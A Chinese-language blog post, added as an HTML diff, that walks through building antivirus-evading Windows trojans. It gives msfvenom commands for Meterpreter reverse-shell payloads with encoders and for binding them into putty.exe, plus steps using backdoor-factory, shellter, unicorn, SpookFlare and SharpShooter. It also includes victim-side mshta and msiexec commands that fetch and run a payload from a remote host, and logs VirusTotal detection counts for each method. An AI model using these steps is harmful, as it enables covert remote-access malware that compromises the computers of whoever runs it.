@@ -1,0 +1,1547 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="免杀技术以及木马处理, Broken-year">
+    <meta name="description" content="免杀技术以及木马处理
+如果需要深入了解
+需要学习：破解、二进制、逆向工程
+
+杀毒软件原理：扫描技术：
+
+扫描压缩包，对压缩包内容进行分析检查
+
+程序篡改防护：
+
+避免感染文件
+
+修复技术：
+
+对受损文件进行还原
+
+急救盘杀毒：
+
+利用空白的">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>免杀技术以及木马处理 | Broken-year</title>
+    <link rel="icon" type="image/png" href="/medias/logo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Broken-year</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Broken-year</div>
+        <div class="logo-desc">
+            
+            这是一个简简单单的博客
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">免杀技术以及木马处理</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+                                <span class="chip bg-color">工具使用</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%9C%A8%E9%A9%AC/">
+                                <span class="chip bg-color">木马</span>
+                            </a>
+                        
+                            <a href="/tags/msf/">
+                                <span class="chip bg-color">msf</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%85%8D%E6%9D%80/">
+                                <span class="chip bg-color">免杀</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                网络安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-03-21
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.4k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="免杀技术以及木马处理"><a href="#免杀技术以及木马处理" class="headerlink" title="免杀技术以及木马处理"></a>免杀技术以及木马处理</h1><blockquote>
+<p>如果需要深入了解</p>
+<p>需要学习：破解、二进制、逆向工程</p>
+</blockquote>
+<h2 id="杀毒软件原理："><a href="#杀毒软件原理：" class="headerlink" title="杀毒软件原理："></a>杀毒软件原理：</h2><p><strong>扫描技术</strong>：</p>
+<blockquote>
+<p>扫描压缩包，对压缩包内容进行分析检查</p>
+</blockquote>
+<p><strong>程序篡改防护</strong>：</p>
+<blockquote>
+<p>避免感染文件</p>
+</blockquote>
+<p><strong>修复技术</strong>：</p>
+<blockquote>
+<p>对受损文件进行还原</p>
+</blockquote>
+<p><strong>急救盘杀毒</strong>：</p>
+<blockquote>
+<p>利用空白的u盘制作进行杀毒</p>
+</blockquote>
+<p><strong>智能扫描</strong>：</p>
+<blockquote>
+<p>扫描常用磁盘和系统关键位置</p>
+</blockquote>
+<p><strong>全盘扫描</strong>：</p>
+<blockquote>
+<p>所有地方都扫描</p>
+</blockquote>
+<p><strong>勒索软件防护</strong>：</p>
+<blockquote>
+<p>保护电脑文件不被加密</p>
+</blockquote>
+<p><strong>开机扫描</strong>：</p>
+<blockquote>
+<p>扫描坑不需要的程序</p>
+</blockquote>
+<p><strong>监控技术</strong>：</p>
+<p>内存监控：</p>
+<blockquote>
+<p>监控内存，进程，网络数据</p>
+</blockquote>
+<p>文件监控：</p>
+<blockquote>
+<p>发现文件存在病毒或者被感染报警</p>
+</blockquote>
+<p>邮件监控：</p>
+<blockquote>
+<p>电子邮件病毒拦截</p>
+</blockquote>
+<p><strong>网页防护</strong>：</p>
+<blockquote>
+<p>阻止网络攻击和不安全的下载</p>
+</blockquote>
+<p><strong>行为防护</strong>：</p>
+<blockquote>
+<p>提醒用户应用程序可疑的行为</p>
+</blockquote>
+<h2 id="安装wine32"><a href="#安装wine32" class="headerlink" title="安装wine32"></a>安装wine32</h2><pre><code>dpkg --add-architecture i386 &amp;&amp; apt update &amp;&amp; apt -y install wine32 
+</code></pre>
+<p>linux支持exe程序</p>
+<h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><pre class=" language-Linux"><code class="language-Linux">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py 
+
+python2 get-pip.py 
+
+apt-get install python3-pip 
+
+pip install --upgrade pip -i https://pypi.douban.com/simple 
+</code></pre>
+<p>python应用商店</p>
+<h2 id="生成一个普通木马"><a href="#生成一个普通木马" class="headerlink" title="生成一个普通木马"></a>生成一个普通木马</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=[端口] -f exe -o shell.exe
+# -p windows/meterpreter/reverse_tcp 利用windows/meterpreter/reverse_tcp 生成木马程序
+# lhost=[ip] lport=[端口] 连接本地ip和端口
+# -o shell.exe 生成名为shell.exe的木马程序
+</code></pre>
+<pre class=" language-Linux"><code class="language-Linux">msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost=192.168.3.134
+show options
+exploit
+
+background
+sessions
+</code></pre>
+<p><a target="_blank" rel="noopener" href="http://virustotal.com/">http://virustotal.com</a></p>
+<blockquote>
+<p>56&#x2F;71</p>
+</blockquote>
+<h2 id="msf自带免杀"><a href="#msf自带免杀" class="headerlink" title="msf自带免杀"></a>msf自带免杀</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -b "\x00" -i 15 -f exe -o shell.exe
+
+# x86/shikata_ga_nai 用自带免杀把软件进行加密
+# 屏蔽\x00 i加密15次
+# -f exe 加密同时不能破坏exe的结构
+</code></pre>
+<blockquote>
+<p>55&#x2F;71</p>
+</blockquote>
+<h2 id="msf捆绑免杀"><a href="#msf捆绑免杀" class="headerlink" title="msf捆绑免杀"></a>msf捆绑免杀</h2><p>比如：一个正经软件+捆绑木马</p>
+<pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -x putty.exe -f exe -o shell.exe
+
+# -x putty.exe 把木马程序捆绑在putty.exe上
+# -f exe 加密同时不能破坏exe的结构
+</code></pre>
+<blockquote>
+<p>44&#x2F;71</p>
+</blockquote>
+<h2 id="msf自带免杀-捆绑"><a href="#msf自带免杀-捆绑" class="headerlink" title="msf自带免杀+捆绑"></a>msf自带免杀+捆绑</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o shell.exe
+
+# 合并前两个操作
+</code></pre>
+<blockquote>
+<p>45&#x2F;70</p>
+</blockquote>
+<h2 id="backdoor-factory"><a href="#backdoor-factory" class="headerlink" title="backdoor factory"></a>backdoor factory</h2><blockquote>
+<p>后门工厂 </p>
+</blockquote>
+<pre class=" language-Linux"><code class="language-Linux">在github搜索backdoor factory
+下载下来之后进入文件夹
+cd the-backdoor-factory-master/
+chmod 777 ./*
+./install.sh
+pip install -i https://pypi.douban.com/simple pefile/capstone
+# 重新安装缺失组件
+
+对某个正经程序插入木马代码：
+# 查看这个程序是否支持插入代码
+python backdoor.py -f /root/putty.exe -S
+
+# 查找程序里大于600的缝隙
+python backdoor.py -f /root/putty.exe -c -l 600
+
+# 获取文件可用的payload
+python backdoor.py -f /root/putty.exe -s show
+
+# 生成payload
+python backdoor.py -f /root/putty.exe -s reverse_shell_tcp_inline -H 192.168.1.144 -P 4444 -J -o haha.exe
+</code></pre>
+<h2 id="用户自己做的木马"><a href="#用户自己做的木马" class="headerlink" title="用户自己做的木马"></a>用户自己做的木马</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.c
+
+python backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shell.c -o haha.exe
+
+# 把木马做成.c的格式
+</code></pre>
+<p>48&#x2F;71</p>
+<h2 id="unicorn独角兽"><a href="#unicorn独角兽" class="headerlink" title="unicorn独角兽"></a>unicorn独角兽</h2><pre class=" language-Linux"><code class="language-Linux">cd unicorn-master/
+ls
+chmod 777 ./*
+python unicorn.py --help
+
+python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.144 4444
+
+# 生成2个文件，xxx.rc文件[meterpreter监听代码]和txt文件[powershell的txt文件攻击代码](powershell的txt文件可以考虑变成bat)
+
+msfconsole -r unicorn.rc
+msfconsole -r xxx.rc
+# 使用代码
+</code></pre>
+<p>6&#x2F;59</p>
+<h2 id="spookflare"><a href="#spookflare" class="headerlink" title="spookflare"></a>spookflare</h2><p>GitHub上搜索</p>
+<pre class=" language-Linux"><code class="language-Linux">cd  SpookFlare-master/
+ls
+chmod 777 ./*
+# 发现有requirements.txt就要去安装Python的依赖库
+
+安装python依赖库
+pip install -i https://pypi.douban.com/simple -r requirements.txt
+
+python  spookflare.py     # 进入
+
+help
+
+list
+use 2
+info    #可以查看需要set的内容【类似于options】
+set PROTO http
+set LHOST 192.168.1.144
+set LPORT 8080
+set ARCH x64
+set SSIZE 61337
+(ps:注意大小写敏感)
+generate    #生成
+</code></pre>
+<blockquote>
+<p>此时生成了三个文件</p>
+</blockquote>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322113335216.png" alt="image-20220322113335216"></p>
+<blockquote>
+<p>把上面那个cs后缀的文件改名为test.cs</p>
+</blockquote>
+<pre class=" language-Linux"><code class="language-Linux">C:\Windows\Microsoft.NET\Framework\v4.0.30319
+
+csc.exe /t:exe /out:test.exe test.cs  //把上面那个cs后缀的文件改名为test.cs
+</code></pre>
+<h2 id="sharpshooter"><a href="#sharpshooter" class="headerlink" title="sharpshooter"></a>sharpshooter</h2><pre class=" language-Linux"><code class="language-Linux">cd   SharpShooter-master/
+ls
+chmod 777 ./*
+# 发现有requirements.txt就要去安装Python的依赖库
+
+# 安装python依赖库
+pip install -i https://pypi.douban.com/simple -r requirements.txt
+
+# 生成txt格式木马
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.144 LPORT=4444 -f raw -o shellcode.txt
+
+# 创建ht  a后门
+python SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./shellcode.txt --sandbox 4 --smuggle --template mcafee
+
+# 得到hta格式和html格式
+
+use  multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.144
+set lport 4444
+exploit
+
+被植入电脑cmd：执行
+mshta.exe http://192.168.1.252/foo.hta
+http://192.168.1.252/foo.html
+</code></pre>
+<p>类似钓鱼网站执行</p>
+<blockquote>
+<p>24&#x2F;61</p>
+</blockquote>
+<h2 id="msf创建hta程序"><a href="#msf创建hta程序" class="headerlink" title="msf创建hta程序"></a>msf创建hta程序</h2><pre class=" language-Linux"><code class="language-Linux">msfconsole
+use exploit/windows/misc/hta_server
+set srvhost [你自己ip]
+set lhost [你自己ip]
+exploit
+
+# 会给你一个网址 http://xxxxxx/xxx.hta
+
+#然后用户可以远程去执行：
+mshta http://xxxxxx/xxx.hta
+</code></pre>
+<blockquote>
+<p>29&#x2F;61</p>
+</blockquote>
+<h2 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h2><pre class=" language-Linux"><code class="language-Linux">apt-get install shellter  # 安装一下，不能在终端操作
+shellter
+A
+PE Target: /root/putty.exe
+</code></pre>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322145051728.png" alt="image-20220322145051728"></p>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322145118755.png" alt="image-20220322145118755"></p>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322145226624.png" alt="image-20220322145226624"></p>
+<p><img src="/2022/03/21/kill-free-trojan/image-20220322145536428.png" alt="image-20220322145536428"></p>
+<blockquote>
+<p>Eable Stealth Mode可以no，不然效果会差一点</p>
+</blockquote>
+<p>39&#x2F;70</p>
+<p>生成之后在msfconsole里使用:</p>
+<pre class=" language-Linux"><code class="language-Linux">handler -H 192.168.1.144 -P 4444 -p windows/meterpreter/reverse_tcp
+
+jobs
+可以看见开启监听
+</code></pre>
+<h2 id="msi执行的木马——可以隔空执行的"><a href="#msi执行的木马——可以隔空执行的" class="headerlink" title="msi执行的木马——可以隔空执行的"></a>msi执行的木马——可以隔空执行的</h2><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f msi > haha.txt
+
+然后在被控制电脑里：
+msiexec /q /i http://192.168.1.252/haha.txt
+</code></pre>
+<blockquote>
+<p>35&#x2F;58</p>
+</blockquote>
+<h2 id="shellcode-launcher"><a href="#shellcode-launcher" class="headerlink" title="shellcode-launcher"></a>shellcode-launcher</h2><p>github</p>
+<pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.raw
+</code></pre>
+<p>需要shellcode-launcher执行</p>
+<pre class=" language-Linux"><code class="language-Linux">shellcode_launcher.exe -i shell.raw
+</code></pre>
+<blockquote>
+<p>24&#x2F;59</p>
+</blockquote>
+<p>免杀在实战中很重要，不过最好得学会编程，不然没办法自己研发出自己的木马，用人家的东西效果一般不太友好。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Broken-year</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Broken-year.github.io/2022/03/21/kill-free-trojan/">http://Broken-year.github.io/2022/03/21/kill-free-trojan/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Broken-year</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
+                                    <span class="chip bg-color">工具使用</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%9C%A8%E9%A9%AC/">
+                                    <span class="chip bg-color">木马</span>
+                                </a>
+                            
+                                <a href="/tags/msf/">
+                                    <span class="chip bg-color">msf</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%85%8D%E6%9D%80/">
+                                    <span class="chip bg-color">免杀</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/03/22/scanner/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="漏洞扫描原理以及SQL注入">
+                        
+                        <span class="card-title">漏洞扫描原理以及SQL注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-22
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">sql注入</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/21/emergency-response/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="黑客攻击应急响应">
+                        
+                        <span class="card-title">黑客攻击应急响应</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
